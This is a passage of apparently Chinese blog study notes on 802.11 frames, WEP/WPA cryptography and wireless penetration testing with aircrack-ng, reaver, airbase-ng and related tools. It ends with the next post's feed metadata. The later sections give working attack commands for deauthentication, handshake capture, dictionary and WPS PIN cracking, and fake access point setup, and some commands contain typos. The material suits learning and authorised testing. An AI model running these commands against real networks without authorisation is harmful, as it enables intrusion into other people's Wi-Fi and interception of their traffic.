title="DADIOTAP头"></a>DADIOTAP头</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">802.1帧发射和接收的事实标准，802.11依赖Radiotap完成通信过程</span><br><span class="line">Linux系统在驱动和API中内建支持Radiotap</span><br><span class="line">802.11帧发射之前，网卡驱动在802.11头前面添加Radiotap头，反之当网卡接收到</span><br><span class="line">无线帧时，驱动通知MAC层，此帧头包含Radiotap头</span><br><span class="line">Radiotap为802.11帧传递额外信息，厂家可自定义，因此头长度不固定</span><br><span class="line">不破坏原始头结构，增加传递的信息</span><br><span class="line"></span><br><span class="line">组成：</span><br><span class="line">分为Header和data</span><br><span class="line">Version (8bit )</span><br><span class="line">	值始终为0</span><br><span class="line">Pad (8bit)</span><br><span class="line">	未使用，只作为字段强制对其的占位;</span><br><span class="line">Length (16bit)</span><br><span class="line">	整个radiotap头长度(可变)，作用是确定802.11头的开始位置</span><br><span class="line">Present (32bit)</span><br><span class="line">	Data段的掩码</span><br><span class="line">	Ext (1、0)</span><br><span class="line">	MAC不能理解的头部直接忽略</span><br></pre></td></tr></table></figure><h4 id="BEACON-FRAMES"><a href="#BEACON-FRAMES" class="headerlink" title="BEACON FRAMES"></a>BEACON FRAMES</h4><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">AP发送的广播帧，通告无线网络的存在(BSSID )</span><br><span class="line">发包频率</span><br><span class="line">	<span class="number">102.4</span>ms (可变)</span><br><span class="line">	时间单位<span class="number">1024</span>ms (<span class="number">60</span>秒)</span><br><span class="line">SSID网络名</span><br><span class="line">	隐藏AP不发SSID广播</span><br><span class="line">IBSSI Status</span><br><span class="line">	<span class="number">0</span>: infrastructure</span><br><span class="line">	<span class="number">1</span>: ad-hoc</span><br><span class="line">Privicy</span><br><span class="line">	WEP、WPA</span><br><span class="line">ESSID</span><br><span class="line">	名称、长度</span><br><span class="line">速率</span><br><span class="line">	<span class="number">802.11</span> g (<span class="number">1</span><span class="number">-54</span>Mbit )</span><br><span class="line">信道</span><br><span class="line">	<span class="number">11</span></span><br></pre></td></tr></table></figure><h4 id="DATA-FRAMES"><a href="#DATA-FRAMES" class="headerlink" title="DATA FRAMES"></a>DATA FRAMES</h4><figure class="highlight lasso"><table><tr><td class="code"><pre><span class="line">传输用户数据</span><br><span class="line">	<span class="built_in">DATA</span> Frame</span><br><span class="line">空数据帧</span><br><span class="line">	<span class="built_in">Null</span> <span class="built_in">data</span> frame</span><br><span class="line">	只包含MAC头和FCS</span><br><span class="line">	STA用于声明自己将要进入省电模式</span><br></pre></td></tr></table></figure><h4 id="连接无线网络完整过程"><a href="#连接无线网络完整过程" class="headerlink" title="连接无线网络完整过程"></a>连接无线网络完整过程</h4><figure class="highlight stata"><table><tr><td class="code"><pre><span class="line">Probe</span><br><span class="line">	STA向所有信道发出probe帧，发现<span class="keyword">AP</span></span><br><span class="line">	<span class="keyword">AP</span>应道Response</span><br><span class="line">Authentication</span><br><span class="line">	STA向<span class="keyword">AP</span>发出验证请求</span><br><span class="line">	发生认证过程(步骤可变)</span><br><span class="line">	<span class="keyword">AP</span>响应STA的认证结果</span><br><span class="line">Association</span><br><span class="line">	STA发出关联请求</span><br><span class="line">	<span class="keyword">AP</span>响应关联请求</span><br><span class="line">	关联成功，开始通信</span><br></pre></td></tr></table></figure><h4 id="WEP探测过程"><a href="#WEP探测过程" class="headerlink" title="WEP探测过程"></a>WEP探测过程</h4><figure class="highlight armasm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Beacon标识使用WEP加密</span></span><br><span class="line"><span class="keyword">STA发送普通Probe帧</span></span><br><span class="line"><span class="keyword">AP响应Probe </span>Response帧声明其采用WEP加密</span><br></pre></td></tr></table></figure><h4 id="WPA探测过程"><a href="#WPA探测过程" class="headerlink" title="WPA探测过程"></a>WPA探测过程</h4><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">两个AP的Beacon包内容不同，但都声明采用了WPA加密</span><br><span class="line">不同厂商对<span class="number">802.11</span>标准的实现方式不同</span><br><span class="line">包头包含WPA1字段信息</span><br></pre></td></tr></table></figure><h4 id="WEP-OPEN认证"><a href="#WEP-OPEN认证" class="headerlink" title="WEP OPEN认证"></a>WEP OPEN认证</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">WEP Open认证与open认证通信过程相同</span><br><span class="line">正确认证后通信数据被WEP加密</span><br><span class="line">如果认证时客户端输入错误密码</span><br><span class="line">	认证依然可以通过</span><br><span class="line">	AP将丢弃该STA的数据包</span><br><span class="line">		起始向量被错误地密钥解密后完整性被破坏</span><br><span class="line">		但数据传输将失败</span><br><span class="line">认证响应正确，身份验证成功</span><br></pre></td></tr></table></figure><h4 id="WEP-PSK认证过程"><a href="#WEP-PSK认证过程" class="headerlink" title="WEP PSK认证过程"></a>WEP PSK认证过程</h4><figure class="highlight stata"><table><tr><td class="code"><pre><span class="line">STA发认证请求</span><br><span class="line"><span class="keyword">AP</span>返回随机Challenge消息</span><br><span class="line">STA使用PSK加密Cha并发回给<span class="keyword">AP</span></span><br><span class="line"><span class="keyword">AP</span>使用PSK解密密文，获得Cha并与</span><br><span class="line">原始Cha比对，相同则验证成功，</span><br><span class="line">不同则验证失败;</span><br><span class="line"></span><br><span class="line">大部分无线驱动首先尝试<span class="keyword">open</span>验证，如失败则尝试PSK</span><br></pre></td></tr></table></figure><h4 id="加密协议"><a href="#加密协议" class="headerlink" title="加密协议"></a>加密协议</h4><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">无线安全根源</span><br><span class="line">	<span class="number">802.11</span>基于无线电波发射信息</span><br><span class="line">	嗅探侦听是主要问题</span><br><span class="line">	加密机制是必须手段</span><br><span class="line">Wired Equivalent Privacy (WEP)</span><br><span class="line">	<span class="number">802.11</span>标准的一部分</span><br><span class="line">	发布后不久被发现存在安全漏洞</span><br><span class="line">WI-Fi Protected Access (WPA)取代WEP</span><br><span class="line">	WPA2 (<span class="number">802.11</span>i标准)</span><br></pre></td></tr></table></figure><h4 id="OPEN无加密网络"><a href="#OPEN无加密网络" class="headerlink" title="OPEN无加密网络"></a>OPEN无加密网络</h4><figure class="highlight stata"><table><tr><td class="code"><pre><span class="line">无任何加密机制</span><br><span class="line">所有数据都可以被嗅探</span><br><span class="line">STA和<span class="keyword">AP</span>只协商拼配参数即可连入网络</span><br></pre></td></tr></table></figure><h3 id="WEP加密算法"><a href="#WEP加密算法" class="headerlink" title="WEP加密算法"></a>WEP加密算法</h3><figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line">使用Rivest Cipher <span class="number">4</span> (RC4)算法加密流量内容，实现机密性</span><br><span class="line">CRC32算法检查数据完整性</span><br><span class="line">标准采用使用<span class="number">24</span>位initialization <span class="type">vector</span> (IV)</span><br><span class="line">受美国加密技术出C限制法律的要求：</span><br><span class="line">	高于<span class="number">64</span>bit <span class="type">key</span>禁止出口</span><br><span class="line">	所以除<span class="number">24</span>bit IV之外真实的<span class="type">key</span>只有<span class="number">40</span>bit的版本被允许出口</span><br><span class="line">	出口限制法律撤销后实现了<span class="number">128</span>bit <span class="type">key</span>的WEP版本(使用相同的<span class="number">24</span>bit IV)</span><br></pre></td></tr></table></figure><h4 id="RC4算法"><a href="#RC4算法" class="headerlink" title="RC4算法"></a>RC4算法</h4><figure class="highlight gauss"><table><tr><td class="code"><pre><span class="line">RSA实验室研发的对称加密-流算法：</span><br><span class="line">	实现简单</span><br><span class="line">	速度快</span><br><span class="line">	</span><br><span class="line">加密:对明文流和密钥流进行<span class="keyword">XOR</span>计算</span><br><span class="line">解密:对密文流和密钥流进行<span class="keyword">XOR</span>计算</span><br><span class="line">RC4算法<span class="built_in">key</span>由两个过程生成：</span><br><span class="line">	合并IV（起始向量）和PSK（共享密钥），利用<span class="built_in">Key</span> Scheduling <span class="built_in">Algorithm</span> (KSA)算法生成起始状态表</span><br><span class="line">	Pseudo -Random Generation <span class="built_in">Algorithm</span> (PRGA)算法生成最终密钥流</span><br></pre></td></tr></table></figure><h3 id="WPA安全系统"><a href="#WPA安全系统" class="headerlink" title="WPA安全系统"></a>WPA安全系统</h3><figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">Wi-Fi <span class="keyword">Protected</span> <span class="keyword">Access</span></span><br><span class="line"><span class="number">802.11</span>i组为提高无线安全，开发两个新的链路层加密协议</span><br><span class="line">	Temporal Key Integrity Protocol (TKIP)</span><br><span class="line">		WPA1 (较之WEP可动态改变密钥)</span><br><span class="line">	Counter Mode <span class="keyword">with</span> CBC-MAC (CCMP)</span><br><span class="line">		WPA2</span><br><span class="line">WPA加密两种安全类型</span><br><span class="line">	WPA个人:使用预设共享密钥实现身份验证</span><br><span class="line">	WPA企业:使用<span class="number">802</span>. <span class="number">1</span>X和Radius服务器实现AAA</span><br></pre></td></tr></table></figure><h4 id="WPA1"><a href="#WPA1" class="headerlink" title="WPA1"></a>WPA1</h4><figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line"><span class="number">802.11</span>i第三版草案</span><br><span class="line">与WEP比较：</span><br><span class="line">	都采用逐包进行密钥加密</span><br><span class="line">	<span class="number">128</span>位的<span class="type">key</span>和<span class="number">48</span>位的初向量(IV)</span><br><span class="line">	RC4流加密数据</span><br><span class="line">	帧计数器避免重放攻击</span><br><span class="line">	TKIP使用Michael算法进行完整性校验(MIC )</span><br><span class="line">		WEP CRC32</span><br><span class="line">	兼容早期版本硬件</span><br></pre></td></tr></table></figure><h4 id="WPA2"><a href="#WPA2" class="headerlink" title="WPA2"></a>WPA2</h4><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">依据802.11i完全重新设计实现</span><br><span class="line">	也被称为Robust Security<span class="built_in"> Network </span>(RSN)</span><br><span class="line">	CCMP替代TKIP</span><br><span class="line">	AES加密算法取代了RC4</span><br><span class="line">	不兼容早期版本硬件</span><br></pre></td></tr></table></figure><h4 id="WPA企业连接过程"><a href="#WPA企业连接过程" class="headerlink" title="WPA企业连接过程"></a>WPA企业连接过程</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">协商安全协议</span><br><span class="line">身份认证</span><br><span class="line">密钥分发和验证</span><br><span class="line">数据加密完整性</span><br></pre></td></tr></table></figure><h4 id="WPA-PSK"><a href="#WPA-PSK" class="headerlink" title="WPA-PSK"></a>WPA-PSK</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">协商安全协议</span><br><span class="line">密钥分发和验证</span><br><span class="line">数据加密完整性</span><br></pre></td></tr></table></figure><h4 id="密钥交换"><a href="#密钥交换" class="headerlink" title="密钥交换"></a>密钥交换</h4><figure class="highlight stata"><table><tr><td class="code"><pre><span class="line">WPA四步握手过程生成PTK：</span><br><span class="line">	<span class="keyword">AP</span>发送Anonce给STA</span><br><span class="line">	STA生成Snonce计算出PTK</span><br><span class="line">	Snonce加PTK的MIC发给<span class="keyword">AP</span></span><br><span class="line">	<span class="keyword">AP</span>拿到Snonce计算出PTK</span><br><span class="line">	<span class="keyword">AP</span>计算MIC与接收的MIC比对</span><br><span class="line">	MIC一致说明确定STA知道PMK</span><br><span class="line">	<span class="keyword">AP</span>发GTK给STA</span><br><span class="line">	STA回复ACK并使用密钥加密</span><br></pre></td></tr></table></figure><h3 id="无线渗透测试"><a href="#无线渗透测试" class="headerlink" title="无线渗透测试"></a>无线渗透测试</h3><h4 id="AIRCRACK-NG基础"><a href="#AIRCRACK-NG基础" class="headerlink" title="AIRCRACK-NG基础"></a>AIRCRACK-NG基础</h4><blockquote><p>无线渗透和审计神器，包含各种功能的工具套件，支持：<br>网络检测<br>嗅探抓包<br>包注入<br>密码破解</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">airmon-ng check #检测是否存在冲突</span><br><span class="line">airmon check kill #杀掉冲突进程</span><br><span class="line"></span><br><span class="line">airmon start wlan2 3  #开启网卡监听模式，工作在3信道</span><br><span class="line">iwlist wlan2mon channel #查看工作信道</span><br><span class="line">airmon stop wlan2mon #关闭监听监听模式</span><br></pre></td></tr></table></figure><h4 id="AIRODUMP-NG"><a href="#AIRODUMP-NG" class="headerlink" title="AIRODUMP-NG"></a>AIRODUMP-NG</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">无线抓包</span><br><span class="line">airodump-ng wlan2mon #在所有信道进行轮询监听数据包</span><br><span class="line">airodump wlan2mon -C 1 --bssid 00:1 1:22:33:44:55 -W file.cap</span><br><span class="line"><span class="meta">	#</span><span class="bash">抓取指定信道、指定AP的数据包，并保存到文件中</span></span><br><span class="line">aireplay -9 wlan2mon</span><br><span class="line">airreplay</span><br><span class="line"></span><br><span class="line">参数说明：</span><br><span class="line">    BSSID: AP的MAC地址</span><br><span class="line">    PWR:网卡接收到的信号强度，距离越近信号越强</span><br><span class="line">    -1:驱动不支持信号强度、STA距离超出信号接受范围</span><br><span class="line">    RXQ:最近10秒成功接收的数据帧的百分比(数据帧、管理帧)，只有在固定信道</span><br><span class="line">    时才会出现，</span><br><span class="line">    Beacons:接收到此AP发送的beacon帧数量</span><br><span class="line">    #Data:抓到的数据帧数量(WEP表示|IV数量) ，包含广播数据帧</span><br><span class="line">    #/s:最近10秒内，每秒平均抓到的帧的数量</span><br><span class="line">    CH:信道号(从beacon帧中获得)，信道重叠时可能发现其他信道</span><br><span class="line">    MB: AP支持的最大速率</span><br><span class="line">    ENC:采用的无线安全技术WEP、WPA、WPA2、OPEN</span><br><span class="line">    CIPHER:采用的加密套件CCMP、TKIP、 WEP40、WEP104</span><br><span class="line">    AUTH:身份认证方法MGT、PSK、 SKA、OPEN</span><br><span class="line">    ESSID:无线网络名称，隐藏AP此值可能为空，airodump从probe和</span><br><span class="line">    association request帧中发现隐藏AP</span><br><span class="line">    STATION: STA的MAC地址</span><br><span class="line">    Lost:通过sequence number判断最近10秒STA发送丢失的数据包数量(管</span><br><span class="line">    理帧、数据帧)</span><br><span class="line">    	干扰、距离</span><br><span class="line">    	发包不能收、收包不能发</span><br><span class="line">    Packets: STA发送的数据包数量</span><br><span class="line">    Probes: STA探测的ESSID</span><br></pre></td></tr></table></figure><h4 id="AIRPLAY-NG"><a href="#AIRPLAY-NG" class="headerlink" title="AIRPLAY-NG"></a>AIRPLAY-NG</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">产生或者加速无线通信流量</span><br><span class="line">	向无线网络中注入数据包</span><br><span class="line">		伪造身份验证</span><br><span class="line">		强制重新身份验证</span><br><span class="line">		抓包重放</span><br><span class="line">	用于后续WEP和WPA密码破解</span><br><span class="line">	支持10种包注入</span><br><span class="line">获取包的两种途径</span><br><span class="line">	指定接口(-i)</span><br><span class="line">	抓包文件pcap (-r)</span><br><span class="line">使用：</span><br><span class="line">aireplay-ng &lt;options&gt; &lt;interface name&gt;</span><br></pre></td></tr></table></figure><blockquote><p>Filter Options</p></blockquote><p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200612155352483.png" alt="image-20200612155352483"></p><h4 id="AIREPLAY-NG排错"><a href="#AIREPLAY-NG排错" class="headerlink" title="AIREPLAY-NG排错"></a>AIREPLAY-NG排错</h4><figure class="highlight stata"><table><tr><td class="code"><pre><span class="line">Aireplay- ng命令挂起没有任何输出</span><br><span class="line">	无线网卡与<span class="keyword">AP</span>工作在不同信道</span><br><span class="line">报错“write failed: Cannot allocate <span class="keyword">memory</span> wi_ write(): llegal seek"</span><br><span class="line">	无线网卡使用Broadcom芯片(bcm43xx) ，替换为b43驱动可解决</span><br><span class="line">可注入但速度很慢，并提示内核消息“rtc: lost some interrupts at 1024Hz"</span><br><span class="line">	没有修正方法，此时可以启动多个aireplay-ng命令提高速度</span><br><span class="line">使用-<span class="keyword">h</span>参数指定注入<span class="keyword">MAC</span>地址与网卡<span class="keyword">MAC</span>地址不一致报错</span><br><span class="line">	建议保持一致(macchange)，先修改<span class="keyword">MAC</span></span><br></pre></td></tr></table></figure><h4 id="AIREPLAY-NG包注入测试"><a href="#AIREPLAY-NG包注入测试" class="headerlink" title="AIREPLAY-NG包注入测试"></a>AIREPLAY-NG包注入测试</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">检测网卡是否可以注入包</span><br><span class="line">检测AP的响应时间</span><br><span class="line">	回包率反应链路质量</span><br><span class="line">如果有两个无线网卡，可以检测具体可以注入哪种攻击</span><br><span class="line">基本测试检测AP对probe广播的响应</span><br><span class="line">	向每AP发30包</span><br><span class="line">	网卡成功发送并可接收包的能力</span><br><span class="line"></span><br><span class="line">基本测试</span><br><span class="line">	aireplay -9 wlan2mon</span><br><span class="line">向隐藏AP/指定SSID注入</span><br><span class="line">	aireplay-ng -9 -e leven -a EC:26:CA:FA:02:DC wlan2mon</span><br></pre></td></tr></table></figure><h4 id="MAC地址绑定攻击"><a href="#MAC地址绑定攻击" class="headerlink" title="MAC地址绑定攻击"></a>MAC地址绑定攻击</h4><figure class="highlight stata"><table><tr><td class="code"><pre><span class="line">管理员误以为<span class="keyword">MAC</span>绑定是一种安全机制</span><br><span class="line">限制可以关联的客户端<span class="keyword">MAC</span>地址</span><br><span class="line">准备<span class="keyword">AP</span></span><br><span class="line">	<span class="keyword">AP</span>基本配置</span><br><span class="line">	<span class="keyword">Open</span>认证</span><br><span class="line">	开启无线过滤</span><br><span class="line">修改<span class="keyword">MAC</span>地址绕过过滤</span><br></pre></td></tr></table></figure><h4 id="WEP攻击"><a href="#WEP攻击" class="headerlink" title="WEP攻击"></a>WEP攻击</h4><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">WEP密码破解原理</span><br><span class="line">	IV并非完全随机</span><br><span class="line">	每<span class="number">224</span>个包可能出现一次IV重用</span><br><span class="line">	收集大量IV之后找出相同IV及其对应密文，分析得出共享密码</span><br><span class="line">回包中包含IV</span><br><span class="line">IV足够多的情况下，任何复杂程度的wep密码都可以被破解</span><br></pre></td></tr></table></figure><h4 id="WEP共享密钥破解"><a href="#WEP共享密钥破解" class="headerlink" title="WEP共享密钥破解"></a>WEP共享密钥破解</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">启动monitor模式</span><br><span class="line">启动抓包并保存抓包</span><br><span class="line">Deauthentication抓取XOR文件</span><br><span class="line">利用XOR文件与AP建立关联:</span><br><span class="line">	aireplay-ng -1 60 -e kifi -y xxxx.xor -a ap的mac -h 我的mac</span><br><span class="line">执行重放攻击（replay）</span><br><span class="line">Deauthentication 使得已经连接的双方断开重连，触发数据包</span><br><span class="line">收集足够DATA之后破解密码 </span><br><span class="line">Airdump-ng data 查看抓到多少IV值</span><br><span class="line">	官方建议值：</span><br><span class="line">		64bit密钥：25万</span><br><span class="line">		128bit密钥：150万</span><br><span class="line"></span><br><span class="line">使用aircrack-ng xxx.cap破解密码</span><br></pre></td></tr></table></figure><h4 id="WPA-PSK攻击"><a href="#WPA-PSK攻击" class="headerlink" title="WPA PSK攻击"></a>WPA PSK攻击</h4><figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line">只有一种密码破解方法：</span><br><span class="line">	WPA不存在WEP的弱点</span><br><span class="line">只能暴力破解：</span><br><span class="line">	<span class="meta">CPU</span>资源</span><br><span class="line">	时间</span><br><span class="line">	字典质量： </span><br><span class="line">		网上共享的字典</span><br><span class="line">		泄露密码</span><br><span class="line">		地区电话号码段</span><br><span class="line">		Crunch生成字典</span><br><span class="line">		Kali中自带的字典文件</span><br><span class="line">		</span><br><span class="line">PSK破解过程：</span><br><span class="line">	启动<span class="keyword">monitor</span> </span><br><span class="line">	开始抓包并保存</span><br><span class="line">	Deauthentication攻击（解除认证攻击）获取<span class="number">4</span>步握手信息</span><br><span class="line">	使用字典暴力破解</span><br></pre></td></tr></table></figure><blockquote><p>首先嗅探指定MAC与AP之间的通信，保存cap文件</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo airodump-ng wlan0mon --bssid C0:A5:DD:9D:BA:2E -c 11 -w wpa</span><br></pre></td></tr></table></figure><blockquote><p>在新的窗口对目标连接进行Deauthentication攻击，从而获取四次握手信息</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo aireplay-ng -0 2 -a C0:A5:DD:9D:BA:2E -c 9C:28:F7:91:47:6E wlan0mon</span><br></pre></td></tr></table></figure><blockquote><p>尝试用kali自带的字典rockyou.txt破解密码，字典可以自行选择合适的</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo aircrack-ng -w rockyou.txt /home/tosang/wpa-01.cap</span><br></pre></td></tr></table></figure><h4 id="AIROLIB破解密码"><a href="#AIROLIB破解密码" class="headerlink" title="AIROLIB破解密码"></a>AIROLIB破解密码</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">设计用于存储ESSID和密码列表（本质上就是先计算再使用）</span><br><span class="line">    计算生成不变的PMK (计算资源消耗型)</span><br><span class="line">    PMK在破解阶段被用于计算PTK (速度快，计算资源要求少)</span><br><span class="line">    通过完整性:摘要值破解密码</span><br><span class="line">    SQLite3数据库存储数据</span><br><span class="line">    </span><br><span class="line">echo kifi &gt; essid.txt #保存SSID</span><br><span class="line">airolib-ng db --import essid essid.txt #导入数据库</span><br><span class="line">airolib-ng db --stats #查看数据库</span><br><span class="line">airolib-ng db --import passwd &lt;wordlist&gt; #导入字典</span><br><span class="line">	自动剔除不合格的WPA字典</span><br><span class="line">airolib-ng db --batch #计算hash密钥</span><br><span class="line">	生成PMK</span><br><span class="line">aircrack-ng -r db wpa.cap #使用计算好的数据库去破解</span><br></pre></td></tr></table></figure><h4 id="JTR密码破解"><a href="#JTR密码破解" class="headerlink" title="JTR密码破解"></a>JTR密码破解</h4><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">John the ripper</span><br><span class="line">    快速的密码破解软件</span><br><span class="line">    支持基于规则扩展密码字典</span><br><span class="line">很多人喜欢用手机号码做无线密码</span><br><span class="line">	获取号段并利用JTR规则增加最后厂<span class="number">1</span>位的数字</span><br><span class="line">配置文件/etc/john/john.conf</span><br><span class="line">    [List.Rules:Wordlist]</span><br><span class="line">    $[<span class="number">0</span><span class="number">-9</span>]$[<span class="number">0</span><span class="number">-9</span>]$[<span class="number">0</span><span class="number">-9</span>]</span><br></pre></td></tr></table></figure><h4 id="WPS"><a href="#WPS" class="headerlink" title="WPS"></a>WPS</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">WPS是WiFi联盟2006年开发的一项技术</span><br><span class="line">    通过PIN码来简化无线接入的操作，无需记住PSK</span><br><span class="line">    路由器和网卡各按一个按钮就能接入无线</span><br><span class="line">    PIN码是分为前后各4位的2段共8位数字</span><br><span class="line">安全漏洞</span><br><span class="line">    2011年被发现安全涉及漏洞</span><br><span class="line">    接入发起方可以根据路由器的返回信息判断前4位是否正确</span><br><span class="line">    而PIN码的后4位只有1000种定义的组合(最后一位是checksum)</span><br><span class="line">    所以全部穷举破解只需要1 1000次尝试</span><br><span class="line">   		PSK: 218,340, 105,584,896</span><br><span class="line">	标准本身没有设计锁定机制，目前多个厂商已实现锁定机制</span><br><span class="line">	</span><br><span class="line">启动侦听模式后，发现支持WPS的AP</span><br><span class="line">	wash -C - wlan0mon</span><br><span class="line">	airodump-ng wlanOmon --wps</span><br><span class="line">爆破PIN码</span><br><span class="line">	reaver - wlan0mon -b &lt;AP mac&gt; -VV</span><br><span class="line">秒破PIN码</span><br><span class="line">	reaver wlan0mon -b &lt;AP mac&gt; -vv-K 1</span><br><span class="line">	pixiewps</span><br><span class="line">	只适用于固定厂商的芯片，成功率很低</span><br><span class="line">reaver -i wlanOmon -b &lt;AP mac&gt; -Vv -P 88888888</span><br></pre></td></tr></table></figure><blockquote><p>查看周围AP的wps信息</p></blockquote><p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200615174111204.png" alt="image-20200615174111204"></p><h4 id="wifite"><a href="#wifite" class="headerlink" title="wifite"></a>wifite</h4><blockquote><p>wifite是一款开箱即用的工具，无需使用各种命令</p></blockquote><h4 id="伪造无线AP"><a href="#伪造无线AP" class="headerlink" title="伪造无线AP"></a>伪造无线AP</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">airbase-ng -a &lt;AP mac&gt; --essid “kifi" -C 11 wlan2mon</span><br><span class="line"><span class="meta">	#</span><span class="bash">伪造一个开放AP</span></span><br><span class="line">apt-get install bridge -utils</span><br><span class="line"><span class="meta">	#</span><span class="bash">安装网桥工具</span></span><br><span class="line">brctl addbr bridge</span><br><span class="line">brctl addif Wifi Bridge ethO</span><br><span class="line">brctl addif Wifi- Bridge atO</span><br><span class="line">ifconfig ethO 0.0.0.0 up</span><br><span class="line">ifconfig atO 0.0.0.0 up</span><br><span class="line">ifconfig bridge 192. 168.1.10 up</span><br><span class="line">route add -net 0.0.0.0 netmask 0.0.0.0 gw 192.168.1.1</span><br></pre></td></tr></table></figure><h4 id="3vilTwinAttacker"><a href="#3vilTwinAttacker" class="headerlink" title="3vilTwinAttacker"></a>3vilTwinAttacker</h4><blockquote><p>一款图形化AP伪造工具</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">安装教程如下：</span><br><span class="line"><span class="meta">$</span><span class="bash"> git <span class="built_in">clone</span> https://github.com/P0cL4bs/3vilTwinAttacker.git</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> 3vilTwinAttacker</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo chmod +x installer.sh</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo ./installer.sh --install</span></span><br></pre></td></tr></table></figure><h4 id="AIRDECAP-NG进行数据解密"><a href="#AIRDECAP-NG进行数据解密" class="headerlink" title="AIRDECAP-NG进行数据解密"></a>AIRDECAP-NG进行数据解密</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">去除802.1 1头</span><br><span class="line">	airdecap-ng -b &lt;AP MAC&gt; 1 .pcap</span><br><span class="line">解密WEP加密数据</span><br><span class="line">	airdecap-ng -W &lt;WEP key&gt;-b &lt;AP MAC&gt; 1 .pcap</span><br><span class="line">	必须与AP建立关联关系</span><br><span class="line">解密WPA加密数据</span><br><span class="line">	airdecap-ng -e kifi -p &lt;PSK&gt; -b &lt;AP MAC&gt; 1 .pcap</span><br><span class="line">	抓包文件中必须包含4步握手信息，否则无解</span><br></pre></td></tr></table></figure><blockquote><p>首先对我的ap进行抓包，使用wireshake查看如下</p></blockquote><p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200616110428548.png" alt="image-20200616110428548"></p><blockquote><p>可以看到，上面数据包的Data字段是加密数据（均是802.11报头），无法直接查看。下面使用airdecap-ng进行解密（我的密码已经打码）</p></blockquote><p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200616111203921.png" alt="image-20200616111203921"></p><blockquote><p>再次使用wireshake查看，已经是tcp/IP报头</p></blockquote><p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200616112022939.png" alt="image-20200616112022939"></p><h4 id="AIRSERV-NG"><a href="#AIRSERV-NG" class="headerlink" title="AIRSERV-NG"></a>AIRSERV-NG</h4><blockquote><p>AIRSERV-NG可以对AP联网远程操作</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">通过网络提供无线网卡服务器</span><br><span class="line">	某些网卡不支持客户端/服务器模式</span><br><span class="line">启动无线侦听</span><br><span class="line">服务器端</span><br><span class="line">	airserv-ng -P 3333 -d wlan2mon</span><br><span class="line">客户端</span><br><span class="line">	airodump-ng 远程ip:3333</span><br><span class="line">某些防火墙会影响C / S间的通信</span><br></pre></td></tr></table></figure><h4 id="AIRTUN-NG进行入侵检测"><a href="#AIRTUN-NG进行入侵检测" class="headerlink" title="AIRTUN-NG进行入侵检测"></a>AIRTUN-NG进行入侵检测</h4><blockquote><p>Airtun-NG是一个虚拟隧道接口创建工具，可以监视所有加密流量以实现wIDS</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">无线入侵检测wIDS</span><br><span class="line">    无线密码和BSSID</span><br><span class="line">    需要获取握手信息</span><br><span class="line">中继和重放</span><br><span class="line">	Repeate / Replay</span><br><span class="line">	</span><br><span class="line">wIDS</span><br><span class="line">    WEP: airtun-ng -a &lt;AP MAC&gt; -W SKA wlan2mon</span><br><span class="line">    WPA: airtun-ng -a &lt;AP MAC&gt; -p PSK te kifi wlan2mon</span><br><span class="line">    	#开启后使用wireshake监听at0可以实时抓取所有包</span><br><span class="line">    	#也可以启用disniff、driftnet等嗅探工具对at0进行木马嗅探</span><br><span class="line">    ifconfig atO up（先开启后前面的命令才会生效）</span><br><span class="line">    四步握手</span><br><span class="line">    理论_上支持多AP的wlDS,但2个AP以上时可靠性会下降</span><br><span class="line">        WPA: airtun-ng -a &lt;AP MAC&gt; -p PSK -e kif1 wlan2mon</span><br><span class="line">        ifconfig at1 up</span><br><span class="line">        多AP不同信道时airodump -C 1,11 wlan2mon</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>Kali</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>SpringCloud学习总结</title>
    <url>/2020/06/22/SpringCloud%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/</url>
